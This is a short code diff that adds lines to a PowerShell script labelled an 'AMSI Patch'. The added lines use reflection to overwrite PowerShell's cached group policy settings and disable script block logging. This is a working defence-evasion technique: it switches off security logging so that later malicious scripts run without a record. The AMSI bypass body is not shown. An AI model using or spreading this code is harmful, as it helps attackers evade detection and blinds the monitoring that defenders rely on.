@@ -1,3 +1,8 @@
+$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
+$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
+$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
+
+
 Write-Host "-- AMSI Patch"
 Write-Host "-- Modified By: Shantanu Khandelwal (@shantanukhande)"
 Write-Host "-- Original Author: Paul Laîné (@am0nsec)"
